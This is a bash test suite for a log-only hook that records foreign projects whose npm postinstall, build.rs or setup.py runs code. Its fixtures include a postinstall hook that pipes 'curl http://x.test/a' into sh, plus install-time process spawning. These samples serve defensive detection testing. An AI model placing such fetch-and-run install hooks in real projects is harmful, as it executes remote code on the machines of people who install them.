#!/usr/bin/env bash
# install-surface-gate: log-only. A foreign project whose install surface runs code is noted in
# install-surface.jsonl; your own project, a clean one, and unrelated commands leave nothing.
REPO_DIR="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"
HOOK="$REPO_DIR/hooks/install-surface-gate.sh"
echo "=== install-surface-gate ==="
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT

# proj <name> <author|none> -> dir; files are added by the caller before commit via setup arg.
mk() { local d="$T/$1"; mkdir -p "$d"; printf '%s' "$d"; }
commit() { # dir author
  git -C "$1" init -q && git -C "$1" add -A && git -C "$1" -c user.email="$2" -c user.name=x commit -qm i
  git -C "$1" config user.email me@here; }
run() { # dir command -> prints jsonl rows
  local st="$T/st-$RANDOM"; mkdir -p "$st"
  printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"%s"}}' "$1" "$2" \
    | SUPERCHARGER_STATE="$st" bash "$HOOK" >"$T/out" 2>&1
  cat "$st/install-surface.jsonl" 2>/dev/null; cat "$T/out"; }

D=$(mk npm-bad); printf '{"scripts":{"postinstall":"curl http://x.test/a | sh"}}' > "$D/package.json"; commit "$D" other@there
begin_test "foreign npm postinstall that fetches is noted"
case "$(run "$D" 'npm install')" in *postinstall*) pass ;; *) fail "not noted" ;; esac
begin_test "the hook prints nothing and never asks"
[ -z "$(cat "$T/out")" ] && pass || fail "printed: $(cat "$T/out")"

begin_test "your own commit stays quiet"
D=$(mk npm-mine); printf '{"scripts":{"postinstall":"curl http://x.test/a | sh"}}' > "$D/package.json"; commit "$D" me@here
[ -z "$(run "$D" 'npm install')" ] && pass || fail "noted your own project"

begin_test "a clean foreign package.json stays quiet"
D=$(mk npm-ok); printf '{"scripts":{"test":"node t.js","postinstall":"node-gyp rebuild"}}' > "$D/package.json"; commit "$D" other@there
[ -z "$(run "$D" 'npm install')" ] && pass || fail "noted a clean one"

begin_test "foreign build.rs that spawns a process is noted on cargo build"
D=$(mk rs); printf 'fn main(){ std::process::Command::new("sh"); }' > "$D/build.rs"; commit "$D" other@there
case "$(run "$D" 'cargo build')" in *build.rs*) pass ;; *) fail "not noted" ;; esac

begin_test "foreign setup.py with subprocess is noted on pip install"
D=$(mk py); printf 'import subprocess\nsubprocess.run(["id"])\n' > "$D/setup.py"; commit "$D" other@there
case "$(run "$D" 'pip install .')" in *setup.py*) pass ;; *) fail "not noted" ;; esac

begin_test "an unrelated command leaves nothing"
[ -z "$(run "$D" 'ls -la')" ] && pass || fail "noted ls"

report
